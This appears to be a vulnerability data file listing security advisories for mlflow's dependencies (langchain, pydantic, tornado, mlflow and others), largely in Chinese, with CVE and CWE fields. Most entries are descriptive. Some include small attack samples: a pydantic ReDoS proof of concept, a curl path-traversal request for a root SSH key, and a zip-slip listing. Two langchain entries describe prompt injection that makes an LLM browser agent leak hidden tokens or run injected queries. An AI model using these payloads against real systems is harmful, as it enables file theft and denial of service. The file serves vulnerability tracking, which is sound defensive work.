mlflow_mlflow,langchain,0.1.20,True,CVE-2024-5998,CWE-502,,<p>LangChain 是一个开源的 Python 库，旨在通过组合性构建基于大语言模型的应用程序。在其 FAISS.deserialize_from_bytes 函数中，存在不信任数据的 pickle 反序列化漏洞。此漏洞的根源在于未能充分验证反序列化后的数据有效性，攻击者可以通过操控输入数据来执行任意命令，利用 os.system 函数。利用此漏洞，攻击者只需向应用程序发送恶意构造的序列化数据即可触发该漏洞。</p>,3,1
mlflow_mlflow,langchain,0.1.20,True,CVE-2024-8309,CWE-89 CWE-74,,<p>LangChain 是一个开源框架，用于开发由大型语言模型（LLM）支持的应用程序。版本 0.2.5 存在 SQL 注入漏洞，此漏洞源于 GraphCypherQAChain 类的不充分输入验证，攻击者可以通过提示注入恶意 SQL 命令来操纵、删除或创建数据。这可能导致未经授权的数据操纵、服务中断、数据泄露、多租户环境的安全漏洞和数据完整性问题。</p>,4,1
mlflow_mlflow,langchain,0.1.20,True,,,,<p>langchain_community是一个基于Python的开源库，旨在简化图形数据库与机器学习的集成。此漏洞存在于Neo4jVector类中，导致对用户输入的清理不足，允许攻击者通过node_label或embedding_node_property进行Cypher注入。攻击者可以通过不安全的用户输入创建、修改或删除数据库中的节点。</p>,1,1
mlflow_mlflow,langchain,0.1.20,True,,,,<p>Langchain 是一个用于构建语言模型应用程序的Python库。该漏洞影响到用 Playwright 浏览器工具包创建的 LLM 浏览器 AI 代理，当目标网站中包含 visibility:hidden 的元素时，外部攻击者可以通过恶意提示获取这些元素的值。这些元素可能包含用于安全目的的令牌，如 CSRF 令牌，此外在 OAuth 2.0 response_mode=form_post 中，包含了用于身份验证和授权的 ID 令牌和访问令牌。这一漏洞的根本原因在于在处理隐藏字段时缺乏严格的安全机制，从而导致通过被注入的恶意代码泄露重要的安全令牌。</p>,3,1
mlflow_mlflow,langchain,0.1.20,True,,,,<p>TiDBChatMessageHistory 类是 langchain 库的一部分，该类用于管理聊天消息的历史记录并从数据库加载消息。该漏洞源于对 parameters 参数 (earliest_time) 的类型未进行验证，攻击者可以通过构造恶意输入来控制数据库查询。具体而言，攻击者可以在 _load_messages_to_cache 方法中传入恶意的 earliest_time 值，从而执行任意 SQL 查询。这使得攻击者能够窃取数据库内容。</p>,3,1
mlflow_mlflow,langchain,0.1.20,True,,,,<p>MRKLOutputParser 是 Langchain 库中的一个输出解析器，负责解析输入文本并确定相应的操作。然而，该组件的 'parse' 函数未能有效处理输入文本中的正则表达式，当文本中包含恶意输入时，可能导致拒绝服务（ReDoS）攻击。由于正则表达式的执行时间与输入大小呈指数关系，恶意输入可能导致解析时间显著增加，进而使服务器变得不可用。</p>,3,1
mlflow_mlflow,langchain,0.1.20,True,,,,<p>Langchain 是一个用于简化文档加载和处理的 Python 库，具有灵活性和可扩展性。该漏洞允许攻击者使用 'file://' URL 方案从服务器读取任意文件的内容，进而导致敏感信息泄露。具体来说，漏洞源于 PlaywrightWebBaseLoader 组件未能正确限制用户输入，攻击者能够触发页面内容加载任意文件。通过构造特定的请求，攻击者可以下载配置文件、环境变量等敏感信息。</p>,3,1
mlflow_mlflow,langchain,0.1.20,True,,,,<p>BibtexLoader 是 Langchain 社区的一个组件，旨在从 bib 文件中提取引用的文献并加载相关的 PDF 文件。该漏洞是由文件名未经过验证引起的，允许攻击者读取位于 bib 文件目录以外的任意 PDF 文件。例如，攻击者可以通过构造特定的 bibtex 条目来访问上层目录中的 '1.pdf' 文件，从而导致未授权的数据访问。</p>,3,1
mlflow_mlflow,langchain,0.1.20,True,,,,<p>Langchain 是一个基于 Python 的数据处理库，用于构建数据处理管道。该库中的 split_text_from_url 方法存在服务器端请求伪造漏洞，攻击者可以利用这一方法来访问敏感的服务器文件或执行恶意代码。攻击者只需提供特制的 URL，例如通过路径遍历载荷（如 file:///etc/passwd）或恶意的 data URI，即可绕过安全限制，从而导致对机密文件的未授权访问或通过注入的转换实现服务器的破坏。</p>,1,1
mlflow_mlflow,pandas,1.5.3,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
mlflow_mlflow,protobuf,4.24.0,True,CVE-2025-4565,CWE-674,2025-06-16,Protobuf 是一种用于序列化结构化数据的库，广泛应用于数据传输、配置文件保存等领域。该漏洞影响 Protobuf 的纯 Python 实现，当对含有任意数量递归组、递归消息或 SGROUP 标签的未受信任数据进行解析时，可能会超过 Python 的递归限制。攻击者可以利用这些递归结构触发无限递归，导致解析进程崩溃，从而造成拒绝服务。,2,2
mlflow_mlflow,pyarrow,8.0.0,True,CVE-2023-47248,CWE-502,,Apache Arrow 是一个跨语言的数据处理平台，支持多种编程语言，并提供高效的数据分析功能。受影响的版本为 0.14.0 到 14.0.0，当应用程序从不受信任的来源读取 Arrow IPC、Feather 或 Parquet 数据时，可能会导致反序列化漏洞。攻击者可以利用恶意文件进行反序列化，从而在服务器上执行任意代码。,1,1
mlflow_mlflow,pyarrow,8.0.0,True,CVE-2024-52338,CWE-502,2024-11-28,Apache Arrow 是一个跨语言的开发平台，用于数据分析的内存列式存储格式。该漏洞涉及到IPC（进程间通信）和Parquet读取器中不可信数据的反序列化。当R包处理来自不可信源（如用户提供的输入文件）的Arrow IPC、Feather或Parquet数据时，可能会导致任意代码执行。,1,2
mlflow_mlflow,pydantic,1.10.6,True,,CWE-1333,2023-10-01,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `validate_email` function due to improper limitation of mail length and the usage of an insecure regular expression.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7360/commits/64cd8266602f5ffa898f938681be3626df345384)
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7673/commits/3cc150ecbf86ac3509e1ca2904bf2c256c3fb558)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7673)
",3,2
mlflow_mlflow,pydantic,1.10.6,True,,CWE-1333,2023-09-20,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the `networks.py` file.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/59d8f38fd6220e3917c53785dbc70317d6f8e631)
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/e4393ae6145c4dadff739990bb0116c6dec3441b)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
",3,2
mlflow_mlflow,pydantic,1.10.6,True,CVE-2024-3772,CWE-1333,2024-04-15,"Pydantic是Pydantic开源的一个库。可以使用 Python 类型提示进行数据验证。
Pydantic 2.4.0之前、1.10.13之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过精心设计的电子邮件字符串造成拒绝服务。",3,0
mlflow_mlflow,requests,2.28.1,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
mlflow_mlflow,requests,2.28.1,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
mlflow_mlflow,requests,2.28.1,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
mlflow_mlflow,tornado,6.1,True,,CWE-444,2023-08-15,"## Summary
Tornado interprets `-`, `+`, and `_` in chunk length and `Content-Length` values, which are not allowed by the HTTP RFCs. This can result in request smuggling when Tornado is deployed behind certain proxies that interpret those non-standard characters differently. This is known to apply to older versions of haproxy, although the current release is not affected.

## Details
Tornado uses the `int` constructor to parse the values of `Content-Length` headers and chunk lengths in the following locations:
### `tornado/http1connection.py:445`
```python3
            self._expected_content_remaining = int(headers[""Content-Length""])
```
### `tornado/http1connection.py:621`
```python3
                content_length = int(headers[""Content-Length""])  # type: Optional[int]
```
### `tornado/http1connection.py:671`
```python3
            chunk_len = int(chunk_len_str.strip(), 16)
```
Because `int(""0_0"") == int(""+0"") == int(""-0"") == int(""0"")`, using the `int` constructor to parse and validate strings that should contain only ASCII digits is not a good strategy. 

",3,-2
mlflow_mlflow,tornado,6.1,True,CVE-2023-28370,CWE-601,2023-05-16,"Tornado是中国龙卷风科技（Tornado）社区的一个Python Web框架和异步网络库。该库通过使用非阻塞网络I / O，可以扩展到成千上万的开放连接，使其非常适合 长时间轮询， WebSocket和其他需要与每个用户建立长期连接的应用程序。
Tornado 6.3.1及之前版本存在安全漏洞，该漏洞源于存在开放重定向漏洞，当访问特制URL时，使用受影响产品的网站用户可能会被重定向到任意网站。",3,0
mlflow_mlflow,tornado,6.1,True,,CWE-444,2023-08-15,"## Overview
[tornado](https://github.com/tornadoweb/tornado) is a Python web framework and asynchronous networking library, originally developed at FriendFeed.

Affected versions of this package are vulnerable to HTTP Request Smuggling due to improper parsing of the `-`, `+`, and `_` characters in chunk length and `Content-Length` fields through the `int` constructor.

**Note:**
Exploiting this vulnerability is possible if Tornado is deployed behind certain proxies that interpret non-standard characters differently, such as older versions of haproxy.
## Remediation
Upgrade `tornado` to version 6.3.3 or higher.
## References
- [GitHub Commit](https://github.com/tornadoweb/tornado/commit/b7a5dd29bb02950303ae96055082c12a1ea0a4fe)
- [GitHub Release](https://github.com/tornadoweb/tornado/releases/tag/v6.3.3)
",3,0
mlflow_mlflow,tornado,6.1,True,,CWE-444,2023-11-01,"## Overview
[tornado](https://github.com/tornadoweb/tornado) is a Python web framework and asynchronous networking library, originally developed at FriendFeed.

Affected versions of this package are vulnerable to HTTP Request Smuggling via the `parse` and `validate strings` capabilities in the `int` constructor. 

**Notes:**

1) This is possible when Tornado is deployed behind certain proxies that interpret those non-standard characters differently.
2) This is known to apply to older versions of `haproxy`, although the current release is not affected.
## Remediation
Upgrade `tornado` to version 6.3.3 or higher.
## References
- [GitHub Commit](https://github.com/tornadoweb/tornado/commit/217295b1dd30f556ea374d62007f6821688f00f0)
- [GitHub Commit](https://github.com/tornadoweb/tornado/commit/b7a5dd29bb02950303ae96055082c12a1ea0a4fe)
",3,0
mlflow_mlflow,tornado,6.1,True,CVE-2024-52804,CWE-400 CWE-770,2024-11-22,Tornado 是一个 Python Web 框架和异步网络库，用于构建高性能的网络应用程序。在 6.4.2 之前的版本中，其解析 HTTP Cookie 的算法存在性能问题。该算法在解析精心构造的恶意 Cookie 头时，会表现出二次复杂度，导致过度的 CPU 消耗，这种解析发生在事件循环线程中，可能阻塞其他请求处理。,3,2
mlflow_mlflow,tornado,6.1,True,CVE-2025-47287,CWE-770,2025-05-15,Tornado 是一个 Python Web 框架和异步网络库。当 Tornado 的 `multipart/form-data` 解析器遇到特定错误时，它会记录警告信息但继续尝试解析剩余数据。这允许远程攻击者生成极大量的日志，从而构成拒绝服务（DoS）攻击。所有低于 6.5.0 版本的 Tornado 均受影响。,2,2
mlflow_mlflow,mlflow,,True,CVE-2024-0520,CWE-22,,Mlflow是一个开源的平台，用于简化机器学习开发的生命周期，包括实验跟踪、代码打包和模型共享与部署。该漏洞源于`mlflow.data.http_dataset_source.py`模块中操作系统命令的特殊元素未得到正确中和，攻击者可以通过操控`Content-Disposition`头部中的文件名或URL路径包含恶意输入来执行任意代码。此漏洞允许攻击者完全控制文件路径，通过路径遍历或绝对路径技术，实现任意文件写入，例如用'../../tmp/poc.txt'或'/tmp/poc.txt'。,1,1
mlflow_mlflow,mlflow,,True,CVE-2024-3099,CWE-475,,Mlflow 是一个用于简化机器学习开发的开源平台，支持跟踪实验、打包可重复的运行和共享与部署模型。该漏洞源于对模型名称的验证不足，允许攻击者通过 URL 编码创建多个同名模型，因此可能导致拒绝服务（DoS），同时攻击者还可以利用此漏洞对数据模型进行污染。由于 URL 编码的模型在处理时被视为与其解码版本不同，从而导致了这一安全问题。,3,1
mlflow_mlflow,mlflow,,True,CVE-2024-2928,CWE-29 CWE-22,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习开发过程，包括实验跟踪、代码打包以及模型的共享与部署。该平台存在安全漏洞，主要由于在解析 URI 片段时未能妥善验证其内容。攻击者可以通过操纵 URI 片段的部分，利用目录遍历序列如 '../' 来读取本地文件系统上的任意文件，甚至包括敏感文件如 '/etc/passwd'。该漏洞是对之前补丁的绕过，表明需要对 URI 的所有部分进行全面验证以防止本地文件包含攻击。,2,1
mlflow_mlflow,mlflow,,True,,,2023-05-01,"### Impact

Users of the MLflow Open Source Project who are hosting the MLflow Model Registry using the ``mlflow server`` or ``mlflow ui`` commands using an MLflow version older than **MLflow 2.3.1** may be vulnerable to a remote file access exploit if they are not limiting who can query their server (for example, by using a cloud VPC, an IP allowlist for inbound requests, or authentication / authorization middleware).

This issue only affects users and integrations that run the ``mlflow server`` and ``mlflow ui`` commands. Integrations that do not make use of ``mlflow server`` or ``mlflow ui`` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way.

The vulnerability is very similar to https://nvd.nist.gov/vuln/detail/CVE-2023-1177, and a separate CVE will be published and updated here shortly.

### Patches

This vulnerability has been patched in MLflow 2.3.1, which was released to PyPI on April 27th, 2023. If you are using ``mlflow server`` or ``mlflow ui`` with the MLflow Model Registry, we recommend upgrading to MLflow 2.3.1 as soon as possible.

### Workarounds
If you are using the MLflow open source ``mlflow server`` or ``mlflow ui`` commands, we strongly recommend limiting who can access your MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism of your choosing.

If you are using the MLflow open source ``mlflow server`` or ``mlflow ui`` commands, we also strongly recommend limiting the remote files to which your MLflow Model Registry and MLflow Tracking servers have access. For example, if your MLflow Model Registry or MLflow Tracking server uses cloud-hosted blob storage for MLflow artifacts, make sure to restrict the scope of your server's cloud credentials such that it can only access files and directories related to MLflow.

### References
",1,-2
mlflow_mlflow,mlflow,,True,,CWE-23,2023-05-04,"## Overview
[mlflow](https://pypi.org/project/mlflow/) is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.

Affected versions of this package are vulnerable to Relative Path Traversal due to allowing the ability to provide relative paths in registered model sources. 

**Note:**

This issue only affects users and integrations that run the `mlflow server` and `mlflow ui` commands. Integrations that do not make use of `mlflow server` or `mlflow ui` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way.

## Workaround

Users who are unable to upgrade to the fixed version should limit who can access MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism.
## Remediation
Upgrade `mlflow` to version 2.3.1 or higher.
## References
- [GitHub Commit](https://github.com/mlflow/mlflow/commit/f73147496e05c09a8b83d95fb4f1bf86696c6342)
- [GitHub Issue](https://github.com/mlflow/mlflow/issues/8273)
- [GitHub PR](https://github.com/mlflow/mlflow/pull/8281)
- [GitHub Release](https://github.com/mlflow/mlflow/releases/tag/v2.3.1)
",1,2
mlflow_mlflow,mlflow,,True,,CWE-284,2023-05-02,"## Overview
[mlflow](https://pypi.org/project/mlflow/) is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.

Affected versions of this package are vulnerable to Access Restriction Bypass. Users of the MLflow Open Source Project who are hosting the MLflow Model Registry using the `mlflow server` or `mlflow ui` commands  may be vulnerable to a remote file access exploit if they are not limiting who can query their server (for example, by using a cloud VPC, an IP allowlist for inbound requests, or authentication / authorization middleware).

This issue only affects users and integrations that run the ``mlflow server`` and ``mlflow ui`` commands. Integrations that do not make use of ``mlflow server`` or ``mlflow ui`` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way. The vulnerability is very similar to [CVE-2023-1177](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-3373049)

## Workarounds
If you are using the MLflow open source `mlflow server` or `mlflow ui` commands, we strongly recommend limiting who can access your MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism of your choosing.

If you are using the MLflow open source `mlflow server` or `mlflow ui` commands, we also strongly recommend limiting the remote files to which your MLflow Model Registry and MLflow Tracking servers have access. For example, if your MLflow Model Registry or MLflow Tracking server uses cloud-hosted blob storage for MLflow artifacts, make sure to restrict the scope of your server's cloud credentials such that it can only access files and directories related to MLflow.
## Remediation
Upgrade `mlflow` to version 2.3.1 or higher.
## References
- [GitHub PR](https://github.com/mlflow/mlflow/pull/8281)
",1,2
mlflow_mlflow,mlflow,,True,,CWE-22,2023-07-02,"## Overview
[mlflow](https://pypi.org/project/mlflow/) is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.

Affected versions of this package are vulnerable to Directory Traversal via the function `_validate_non_local_source_contains_relative_paths` due to improper validation of the 'source' parameter.

## Details

A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with ""dot-dot-slash (../)"" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
```
**Note** `%2e` is the URL encoded version of `.` (dot).

- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. 

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys
```

## Remediation
Upgrade `mlflow` to version 2.4.1 or higher.
## References
- [GitHub ChangeLog](https://github.com/mlflow/mlflow/blob/6701fca95c8ee9ce1712c09a5291b0531c2fb108/CHANGELOG.md?plain=1#L14)
- [GitHub PR](https://github.com/mlflow/mlflow/pull/8648)
",2,2
mlflow_mlflow,mlflow,,True,CVE-2023-2780,CWE-29,,mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发和部署。该漏洞源于 mlflow 没有正确验证来源的 URL，导致攻击者能够通过相对路径访问预期目录之外的文件并读取任意文件。攻击者可以使用形如 'file://./etc/' 的字符串绕过检查，从而下载与 mlflow 无关的任意文件，包括服务器上已存储的敏感文件。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-30172,CWE-22,2023-05-10,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow v2.0.1版本及之前版本存在安全漏洞。攻击者利用该漏洞可以通过path参数读取服务器上的任意文件。",2,2
mlflow_mlflow,mlflow,,True,CVE-2023-2356,CWE-23,,MLflow 是一个开源的机器学习平台，用于管理机器学习项目、跟踪实验、构建模型和部署代码。MLflow 在 2.3.1 版本之前存在文件读取漏洞。攻击者在请求 /api/2.0/mlflow/registered-models/create 路由时可以通过 source 参数指定路径，随后利用 /model-versions/get-artifact 路由读取任意文件内容，可能导致敏感信息泄露。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-27133,CWE-79,2024-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 存在跨站脚本漏洞，该漏洞源于缺乏对 dataset table字段的清理，导致跨站脚本。",2,0
mlflow_mlflow,mlflow,,True,CVE-2024-27132,CWE-79,2024-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 存在跨站脚本漏洞，该漏洞源于缺乏对 template变量的清理，导致跨站脚本。",2,0
mlflow_mlflow,mlflow,,True,CVE-2023-6977,CWE-29,,MLflow 是一个用于简化机器学习开发的开源平台，支持实验跟踪、代码打包以及模型的共享和部署。在版本 2.9.2 之前的 MLflow 中，存在一个安全漏洞。该漏洞源于 `is_local_uri()` 函数未能正确验证 URI，攻击者可以利用此漏洞从主机服务器下载任意文件，包括任何主机服务器可以访问的远程位置的文件。该漏洞允许攻击者读取服务器上的敏感文件。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6909,CWE-29,,MLflow 是一个开源的平台，用于简化机器学习的开发，包括跟踪实验、将代码打包成可重现的运行以及共享和部署模型。受影响的版本在处理特制的文件路径时存在路径遍历问题，攻击者可能利用此漏洞读取或写入限制目录外的文件，这主要是由于在特定函数 `validate_path_is_safe` 中对路径的不足消毒所致。利用此漏洞时，攻击者提交经过设计的文件路径，可能包括 `..\` 序列，造成对任意文件的访问。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6975,CWE-29,,mlflow 是一个开源的机器学习生命周期管理平台，具有实验跟踪、代码打包和模型共享等功能。存在路径遍历漏洞，攻击者可以通过特制的路径输入（利用目录遍历序列）来获取未授权的读或写权限，从而访问服务器上的文件。该漏洞源于对 FTP 模型中的路径验证的不当处理，允许攻击者进行远程代码执行，并检索数据和模型信息。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6976,CWE-434,,MLflow 是一个开放源代码的平台，用于简化机器学习开发，包括追踪实验、将代码打包为可重复运行的代码和共享及部署模型。受影响的版本存在目录遍历漏洞，通过在路径名中包含 `#` 可以绕过 `validate_path_is_safe()` 检查，从而允许攻击者向服务器上任意位置写入文件。该漏洞可以通过恶意的 `zip` 压缩包利用，导致路径遍历，最终在服务器的文件系统中写入恶意代码。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6974,CWE-918,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习项目的开发与管理。然而，MLflow 存在一个服务器端请求伪造 (SSRF) 漏洞。该漏洞的根本原因在于在处理 HTTP 请求时未能正确限制重定向行为，攻击者可以利用 `_download_file()` 函数触发此漏洞，访问内部资源并实现任意文件写入。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6940,CWE-77,,mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发、跟踪和部署。此漏洞源于对 jinja2 模板引擎的处理不当，攻击者可以利用其绕过安全限制，从而在受害者的系统上进行完整的命令执行。受影响的版本为 1.27.0 至 2.9.1，攻击者只需通过一次用户交互（例如下载恶意配置）即可发起攻击。,1,1
